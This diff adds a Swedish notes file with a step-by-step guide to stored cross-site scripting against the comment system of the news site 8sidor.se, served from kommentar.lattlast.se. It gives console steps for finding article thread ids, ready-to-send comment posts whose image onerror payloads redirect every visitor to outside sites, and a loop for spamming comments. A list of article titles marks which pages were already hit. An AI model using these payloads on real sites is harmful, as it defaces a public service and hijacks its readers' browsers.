@@ -1,0 +1,116 @@
+﻿// Redirectar till en kille som kastar pingis
+	ung svensk utslagen
+	//Redirectar till annoying site (KLICKA INTE)
+	älgar i långsam tv
+	//Redirectar till google sökning homosexuella hundar
+	njut försiktigt av solen
+	Failad google sökning homosexuella hundar + random alert
+	flera skogar brinner 
+	Dark mode (tacka mig)
+	usa är världsmästare igen
+	
+
+	greta talade i eu igen
+	
+
+	sköterskor kan tjäna bra isommar
+	
+
+	inga bevis att trump gjorde brott
+	
+
+	politiker misstänks för fusk
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	1. Hitta thread id:n (artikel id:n). Gå till f12, sources, kommentar.lattlast.se/static/js/comments.js. Gå till rad 86 där functionen makeCrossDomainPost ligger.
+Högst upp i den funktionen så skriv console.log(params.thread). Gå tillbaks till artikeln och skicka en random kommentar. Öppna konsolen och notera nummret som skrevs precis.
+2. Gör funktionen tillgänglig från konsolen. Gå till js filen till och kopiera funktionen från rad 86 till 132 (inklusiv). Gå till konsolen och skriv: 
+        post = 'funktionen du precis kopierade'
+och klicka enter
+3. Skriv kommentaren. Format:
+post('https://kommentar.lattlast.se/comment', {
+        poster_name: 'Namn', 
+        text: '<img src='x' onerror=javascript här'>', 
+        thread: id:n som du listade ut tidigare, 
+        domain: '8sidor.se'
+})
+
+
+Exempel för att redirecta:
+ text: '<img src='x' onerror=window.location.href='//ludvigdb.x10.bz'>'
+'//' behövs för att göra url:n 'absolut' (inte lokal). 8sidor blockar länkar, så detta krävs
+4. Enter
+Klart!
+
+
+post('https://kommentar.lattlast.se/comment', {
+        poster_name: 'Gunnarzxsss', 
+        text: '<img src='x' onerror=window.location.href='//www.youtube.com/watch?v=pFNiXl8vMjs', 
+        thread: id:n som du listade ut tidigare, 
+        domain: '8sidor.se'
+})
+
+
+
+
+post('https://kommentar.lattlast.se/comment', {
+        poster_name: 'Gunnarzxsss', 
+        text: '<img src='x' onerror=window.location.href='//youtube.com/watch?v=pFNiXl8vMjs', 
+        thread: 60618, 
+        domain: '8sidor.se'
+})
+<img src='x' onerror=window.location.href='//www.youtube.com/watch?v=pFNiXl8vMjs
+
+
+https://youtu.be/Xw1k20DpHfA
+60586
+
+
+var i = 0;
+while (i < 2) {
+post('https://kommentar.lattlast.se/comment', {
+        poster_name: 'Namn', 
+        text: 'Strejkar är både bra och dåliga', 
+        thread: 60658, 
+        domain: '8sidor.se'
+})
+i++;
+}
